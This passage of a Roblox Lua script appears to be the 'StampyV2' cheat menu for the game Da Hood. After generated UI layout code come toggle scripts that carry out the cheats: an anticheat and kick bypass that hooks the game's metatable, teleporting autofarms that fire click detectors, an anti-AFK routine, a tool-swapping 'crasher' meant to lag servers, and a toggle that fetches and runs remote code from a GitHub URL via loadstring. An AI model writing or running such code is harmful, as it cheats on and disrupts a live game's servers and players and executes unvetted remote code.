AutoFarm_5.Font = Enum.Font.Roboto
AutoFarm_5.Text = "Anti Kick"
AutoFarm_5.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_5.TextSize = 16.000
AutoFarm_5.TextXAlignment = Enum.TextXAlignment.Left

Toggle_9.Name = "Toggle"
Toggle_9.Parent = AutoFarm_5
Toggle_9.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_9.BackgroundTransparency = 1.000
Toggle_9.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_9.Size = UDim2.new(0, 34, 0, 20)
Toggle_9.Image = "rbxassetid://3570695787"
Toggle_9.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_9.ScaleType = Enum.ScaleType.Slice
Toggle_9.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_9.SliceScale = 0.120

Button_9.Name = "Button"
Button_9.Parent = Toggle_9
Button_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_9.BackgroundTransparency = 1.000
Button_9.Size = UDim2.new(1, 0, 1, 0)
Button_9.Font = Enum.Font.SourceSans
Button_9.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_9.TextSize = 14.000
Button_9.TextTransparency = 1.000

Circle_9.Name = "Circle"
Circle_9.Parent = Toggle_9
Circle_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_9.BackgroundTransparency = 1.000
Circle_9.Position = UDim2.new(0, 4, 0, 3)
Circle_9.Size = UDim2.new(0, 11, 0, 13)
Circle_9.Image = "rbxassetid://3570695787"
Circle_9.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_9.ScaleType = Enum.ScaleType.Slice
Circle_9.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_9.SliceScale = 0.120

AutoFarm_6.Name = "AutoFarm"
AutoFarm_6.Parent = UiListLayoutHolder_3
AutoFarm_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_6.BackgroundTransparency = 1.000
AutoFarm_6.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_6.Size = UDim2.new(0, 65, 0, 16)
AutoFarm_6.Font = Enum.Font.Roboto
AutoFarm_6.Text = "Anti Flash"
AutoFarm_6.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_6.TextSize = 16.000
AutoFarm_6.TextXAlignment = Enum.TextXAlignment.Left

Toggle_10.Name = "Toggle"
Toggle_10.Parent = AutoFarm_6
Toggle_10.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_10.BackgroundTransparency = 1.000
Toggle_10.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_10.Size = UDim2.new(0, 34, 0, 20)
Toggle_10.Image = "rbxassetid://3570695787"
Toggle_10.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_10.ScaleType = Enum.ScaleType.Slice
Toggle_10.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_10.SliceScale = 0.120

Button_10.Name = "Button"
Button_10.Parent = Toggle_10
Button_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_10.BackgroundTransparency = 1.000
Button_10.Size = UDim2.new(1, 0, 1, 0)
Button_10.Font = Enum.Font.SourceSans
Button_10.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_10.TextSize = 14.000
Button_10.TextTransparency = 1.000

Circle_10.Name = "Circle"
Circle_10.Parent = Toggle_10
Circle_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_10.BackgroundTransparency = 1.000
Circle_10.Position = UDim2.new(0, 4, 0, 3)
Circle_10.Size = UDim2.new(0, 11, 0, 13)
Circle_10.Image = "rbxassetid://3570695787"
Circle_10.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_10.ScaleType = Enum.ScaleType.Slice
Circle_10.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_10.SliceScale = 0.120

AutoFarm_7.Name = "AutoFarm"
AutoFarm_7.Parent = UiListLayoutHolder_3
AutoFarm_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_7.BackgroundTransparency = 1.000
AutoFarm_7.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_7.Size = UDim2.new(0, 65, 0, 16)
AutoFarm_7.Font = Enum.Font.Roboto
AutoFarm_7.Text = "Anti Cmds"
AutoFarm_7.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_7.TextSize = 16.000
AutoFarm_7.TextXAlignment = Enum.TextXAlignment.Left

Toggle_11.Name = "Toggle"
Toggle_11.Parent = AutoFarm_7
Toggle_11.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_11.BackgroundTransparency = 1.000
Toggle_11.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_11.Size = UDim2.new(0, 34, 0, 20)
Toggle_11.Image = "rbxassetid://3570695787"
Toggle_11.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_11.ScaleType = Enum.ScaleType.Slice
Toggle_11.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_11.SliceScale = 0.120

Button_11.Name = "Button"
Button_11.Parent = Toggle_11
Button_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_11.BackgroundTransparency = 1.000
Button_11.Size = UDim2.new(1, 0, 1, 0)
Button_11.Font = Enum.Font.SourceSans
Button_11.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_11.TextSize = 14.000
Button_11.TextTransparency = 1.000

Circle_11.Name = "Circle"
Circle_11.Parent = Toggle_11
Circle_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_11.BackgroundTransparency = 1.000
Circle_11.Position = UDim2.new(0, 4, 0, 3)
Circle_11.Size = UDim2.new(0, 11, 0, 13)
Circle_11.Image = "rbxassetid://3570695787"
Circle_11.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_11.ScaleType = Enum.ScaleType.Slice
Circle_11.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_11.SliceScale = 0.120

AutoFarm_8.Name = "AutoFarm"
AutoFarm_8.Parent = UiListLayoutHolder_3
AutoFarm_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_8.BackgroundTransparency = 1.000
AutoFarm_8.Position = UDim2.new(0, 0, 0.0550931767, 0)
AutoFarm_8.Size = UDim2.new(0, 65, 0, 16)
AutoFarm_8.Font = Enum.Font.Roboto
AutoFarm_8.Text = "Ac Bypass"
AutoFarm_8.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm_8.TextSize = 16.000
AutoFarm_8.TextXAlignment = Enum.TextXAlignment.Left

Toggle_12.Name = "Toggle"
Toggle_12.Parent = AutoFarm_8
Toggle_12.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle_12.BackgroundTransparency = 1.000
Toggle_12.Position = UDim2.new(1.5709219, -23, 0.464981467, -11)
Toggle_12.Size = UDim2.new(0, 34, 0, 20)
Toggle_12.Image = "rbxassetid://3570695787"
Toggle_12.ImageColor3 = Color3.fromRGB(31, 31, 31)
Toggle_12.ScaleType = Enum.ScaleType.Slice
Toggle_12.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle_12.SliceScale = 0.120

Button_12.Name = "Button"
Button_12.Parent = Toggle_12
Button_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button_12.BackgroundTransparency = 1.000
Button_12.Size = UDim2.new(1, 0, 1, 0)
Button_12.Font = Enum.Font.SourceSans
Button_12.TextColor3 = Color3.fromRGB(0, 0, 0)
Button_12.TextSize = 14.000
Button_12.TextTransparency = 1.000

Circle_12.Name = "Circle"
Circle_12.Parent = Toggle_12
Circle_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle_12.BackgroundTransparency = 1.000
Circle_12.Position = UDim2.new(0, 4, 0, 3)
Circle_12.Size = UDim2.new(0, 11, 0, 13)
Circle_12.Image = "rbxassetid://3570695787"
Circle_12.ImageColor3 = Color3.fromRGB(17, 17, 17)
Circle_12.ScaleType = Enum.ScaleType.Slice
Circle_12.SliceCenter = Rect.new(100, 100, 100, 100)
Circle_12.SliceScale = 0.120

TextLabel_3.Parent = FarmFrame_3
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0, 0, -0.0935742706, 0)
TextLabel_3.Size = UDim2.new(0, 59, 0, 14)
TextLabel_3.Font = Enum.Font.Highway
TextLabel_3.Text = "Protections"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 18.000
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

Bar.Name = "Bar"
Bar.Parent = StampyV2
Bar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Bar.BorderColor3 = Color3.fromRGB(20, 20, 20)
Bar.Position = UDim2.new(0.0209999997, 0, 0.230000004, 0)
Bar.Size = UDim2.new(0, 364, 0, 1)

-- Scripts:

local function QBZSXTW_fake_script() -- Toggle.Script 
	local script = Instance.new('LocalScript', Toggle)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				shared.MoneyFarm = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				
				-- Naked
				local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
				pcall(function()
					hummy.Parent.Pants:Destroy()
				end)
				pcall(function()
					hummy.Parent.Shirt:Destroy()
				end)
	
	
	
				--Anti Afk
				print("D")
	
	
			--[[
	        Below Is The Source Code Of My AutoFarm Idc If It Gets Shared Out
	]]
				repeat
					wait()
				until game:IsLoaded()
				local gm = getrawmetatable(game)
				setreadonly(gm, false)
				local namecall = gm.__namecall
				gm.__namecall =
					newcclosure(
						function(self, ...)
							local args = {...}
							if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
							if tostring(getcallingscript()) ~= "Framework" then
								return
							end
						end
							if not checkcaller() and getnamecallmethod() == "Kick" then
							return
						end
							return namecall(self, unpack(args))
						end
					)
	
				local LocalPlayer = game:GetService("Players").LocalPlayer
	
				function gettarget()
					local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
					local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart") -- Getting Humanoid.
					local maxdistance = math.huge
					local target
					for i, v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
						if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then -- This is set to head as you can only tp to head
							local distance = (HumanoidRootPart.Position - v.Head.Position).magnitude
							if distance < maxdistance then
								target = v
								maxdistance = distance
							end
						end
					end
					return target
				end
	
				for i, v in pairs(workspace:GetDescendants()) do
					if v:IsA("Seat") then
						v:Destroy() -- Destroys Seating During Farm // Can Be Used As A Script Itself.
					end
				end
	
	
	
				shared.MoneyFarm = true -- Vice Versa // Set To False To Stop Autofarming (Can Be In Same Button)
	
				while shared.MoneyFarm do
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Stampy's Mobile Farm ", "All") -- Creates A Text every single time you get to a new atm
					wait()
	
					local Target = gettarget()
					repeat
						wait()
						pcall(
							function()
								local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
								local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
								local Combat = LocalPlayer.Backpack:FindFirstChild("Combat") or Character:FindFirstChild("Combat") -- Finding Fist // Set To Wallet For Test. -- Revolver // Double Shotgun // Combat Etc
								if not Combat then
									Character:FindFirstChild("Humanoid").Health = 0
									return
								end
								HumanoidRootPart.CFrame = Target.Head.CFrame * CFrame.new(0, -2.5, 3) -- Cframe tp (dont change it tps you perfeclty infront of the atm)
								Combat.Parent = Character
								Combat:Activate() -- Pulls out fists
							end
						)
					until not Target or Target.Humanoid.Health < 0
					for i, v in pairs(game:GetService("Workspace").Ignored.Drop:GetDescendants()) do
						if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:find("Money") then -- Detecting Money
							local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
							local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
							if (v.Parent.Position - HumanoidRootPart.Position).magnitude <= 18 then
								repeat
									wait()
									fireclickdetector(v)
								until not v or not v.Parent.Parent
							end
						end
					end
					wait(1.3)
				end
				
				end --When true
			end
		end)
	
end
coroutine.wrap(QBZSXTW_fake_script)()
local function FXJGGM_fake_script() -- Toggle_2.Script 
	local script = Instance.new('LocalScript', Toggle_2)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				getgenv().shoefarm = false
				game.Players.LocalPlayer.Character.Humanoid:Destroy()
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				-- Shoe Farm By Haze
	
				getgenv().shoefarm = true
	
				coroutine.wrap(function()
					game:GetService("RunService").Stepped:Connect(function()
						if getgenv().shoefarm == true then
							
						end
					end)
				end)()
	
				while getgenv().shoefarm == true do wait()
					for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
						if v:IsA("MeshPart") then
							local mag = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).magnitude
							if mag < 200 then
								wait(0.1)
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(-5,0,0)
								wait(0.1)
								fireclickdetector(v.ClickDetector)
							else
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(-5,0,0)
							end
						end
					end
	
					if game.Workspace.Ignored.Drop:FindFirstChild("MeshPart") == nil then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored["Clean the shoes on the floor and come to me for cash"].HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
						wait(0.3)
						fireclickdetector(game.Workspace.Ignored["Clean the shoes on the floor and come to me for cash"].ClickDetector)
					end
				end
				
				end --When true
			end
		end)
	
end
coroutine.wrap(FXJGGM_fake_script)()
local function JCZTYE_fake_script() -- Toggle_3.Script 
	local script = Instance.new('LocalScript', Toggle_3)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				_G.toggle = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				--BROUGHT TO YOU BY RSCRIPTS.NET!--
	
				_G.toggle = true -- if you want to turn it off change to false and re-execute
				game:getService("RunService"):BindToRenderStep(
				"",
				0,
				function()
					if not game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid") then
						return
					end
					while wait() do
						if _G.toggle == true then
							game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid")
						end
					end
				end
				)
				while wait(1) do
					if _G.toggle == true then
						pcall(
							function()
								for i, v in pairs(game:GetService("Workspace").Ignored.HospitalJob:GetChildren()) do
									if v:IsA("Model") then
										_G.patient = v.Name
										game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
											game.Workspace.Ignored.HospitalJob[v.Name].HumanoidRootPart.CFrame *
											CFrame.new(Vector3.new(0, -6.5, 0), Vector3.new(0, 100, 0))
									end
								end
								for i, v in pairs(game.Workspace.Ignored.HospitalJob:GetChildren()) do
									if v.Name == "Can I get the Red bottle" then
										local clickdetector = game.Workspace.Ignored.HospitalJob.Red.ClickDetector
										fireclickdetector(clickdetector)
									elseif v.Name == "Can I get the Blue bottle" then
										local clickdetector = game.Workspace.Ignored.HospitalJob.Blue.ClickDetector
										fireclickdetector(clickdetector)
									elseif v.Name == "Can I get the Green bottle" then
										local clickdetector = game.Workspace.Ignored.HospitalJob.Green.ClickDetector
										fireclickdetector(clickdetector)
									end
								end
								local clickdetector2 = game:GetService("Workspace").Ignored.HospitalJob[_G.patient].ClickDetector
								fireclickdetector(clickdetector2)
							end
						)
					elseif _G.toggle == false then
						return
					end
				end
			end
		end
		end)
	
end
coroutine.wrap(JCZTYE_fake_script)()
local function LXBUPF_fake_script() -- Toggle_4.Script 
	local script = Instance.new('LocalScript', Toggle_4)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	local plr = game.Players.LocalPlayer
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				plr.Character["[Lettuce]"]:Activate()
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				local TeleportToSafeZone = false; -- If you want to be teleported to a safe zone away from players (true = yes, false = no)
	
				
				----------------------------------- | Don't worry about the rest
				local Part = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"]
	
				local Working = true
	
				plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
	
				fireclickdetector(Part.ClickDetector)
	
				plr.Backpack["[Lettuce]"].Parent = plr.Character
	
				Working = true
				while Working do
					fireclickdetector(Part.ClickDetector)
					plr.Character["[Lettuce]"]:Activate()
					if TeleportToSafeZone then
						plr.Character.HumanoidRootPart.CFrame = CFrame.new(86.081665, -25.2122707, -337.847443)
					end
					
					wait()
				end
				
	
				
				end --When true
			end
		end)
	
end
coroutine.wrap(LXBUPF_fake_script)()
local function YMWGIPH_fake_script() -- Toggle_5.Script 
	local script = Instance.new('LocalScript', Toggle_5)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				getgenv().shoefarm = false
				game.Players.LocalPlayer.Character.Humanoid:Destroy()
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				local TeleportToSafeZone = false; -- If you want to be teleported to a safe zone away from players (true = yes, false = no)
	
	
				----------------------------------- | Don't worry about the rest
				local plr = game.Players.LocalPlayer
				local Part = game:GetService("Workspace").Ignored.Shop["[HeavyWeights] - $250"]
	
				local Working = false
	
				plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
				wait(0.5)
				fireclickdetector(Part.ClickDetector)
				wait(1)
				plr.Backpack["[HeavyWeights]"].Parent = plr.Character
				wait(1)
				Working = true
				while Working do
					if TeleportToSafeZone then
						plr.Character.HumanoidRootPart.CFrame = CFrame.new(86.081665, -25.2122707, -337.847443)
					end
					plr.Character["[HeavyWeights]"]:Activate()
					wait()
				end
				
				end --When true
			end
		end)
	
end
coroutine.wrap(YMWGIPH_fake_script)()
local function LNOXZ_fake_script() -- Toggle_6.Script 
	local script = Instance.new('LocalScript', Toggle_6)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				print("OFF")
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				--Anti Afk
				local vu = game:GetService("VirtualUser")
				game:GetService("Players").LocalPlayer.Idled:connect(function()
					vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
					wait(1)
					vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
				end)
				
				end --When true
			end
		end)
	
end
coroutine.wrap(LNOXZ_fake_script)()
local function TWHGIXI_fake_script() -- Toggle_7.Script 
	local script = Instance.new('LocalScript', Toggle_7)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Stampy's Mobile Crasher ", "All")
				wait(2)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Stampy's Mobile Crasher Loaded ", "All")
				wait(1)
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dont Leave Be Patient :)", "All")
				local Tool = 'Wallet' 
	
				local plr = game.Players.LocalPlayer
				local char = plr.Character
				local bp = plr.Backpack
	
				game["Run Service"].Stepped:Connect(function()
					game["Run Service"].Stepped:Connect(function()
						if char:FindFirstChild(Tool) then
							char:FindFirstChild(Tool).Parent = bp
						else
								bp:FindFirstChild(Tool).Parent = char
								
						end
					end)
				end)
			end
		end
		
		end)
	
end
coroutine.wrap(TWHGIXI_fake_script)()
local function LDSVCPU_fake_script() -- Toggle_8.Script 
	local script = Instance.new('LocalScript', Toggle_8)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				local plr = game.Players.LocalPlayer
				local L_10_ = game:GetService'Players'.LocalPlayer
				local L_501_ = '[Surgeon Mask] - $25'
				local L_502_ = game.Workspace.Ignored.Shop[L_501_]
				local L_503_ = L_10_.Character.HumanoidRootPart.Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = L_502_.Head.CFrame + Vector3.new(0, 3, 0)
				wait(0.2)
				fireclickdetector(game.Workspace.Ignored.Shop[L_501_].ClickDetector)
				fireclickdetector(game.Workspace.Ignored.Shop[L_501_].ClickDetector)
				L_10_.Character.HumanoidRootPart.CFrame = CFrame.new(L_503_)
				L_10_.Character.HumanoidRootPart.CFrame = CFrame.new(L_503_)
				plr.Character["[Surgeon Mask]"]:Activate()
	end
			end
		
		end)
end
coroutine.wrap(LDSVCPU_fake_script)()
local function CPRDR_fake_script() -- Toggle_9.Script 
	local script = Instance.new('LocalScript', Toggle_9)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
				print("OFF")
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				loadstring(game:HttpGet("https://raw.githubusercontent.com/xaxaxaxaxaxaxaxaxa/Bypasses/main/Da-Hood", true))()
				end --When true
			end
		end)
	
end
coroutine.wrap(CPRDR_fake_script)()
local function HMYWQ_fake_script() -- Toggle_10.Script 
	local script = Instance.new('LocalScript', Toggle_10)

	local toggled = false -- The start state of the toggle
	local debounce = false -- Debounce / cooldown so you cant spam the toggle and break it
	
	script.Parent.Button.MouseButton1Click:Connect(function() -- Gets executed when you click the button
		if debounce == false then
			if toggled == true then -- If the toggle is already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(31, 31, 31)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 4,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = false
			elseif toggled == false then -- If the toggle isnt already on
				debounce = true
				game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25), {ImageColor3 = Color3.fromRGB(94, 105, 255)}):Play()
				game:GetService("TweenService"):Create(script.Parent.Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 18,0, 3)}):Play()
				wait(0.25)
				debounce = false
				toggled = true
				while true do
					local XD = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui
	
					if XD:FindFirstChild("whiteScreen") then
						XD.whiteScreen:Destroy()
					end
					wait(0.2)
				end
			end
		end
		
		end)
end
coroutine.wrap(HMYWQ_fake_script)()
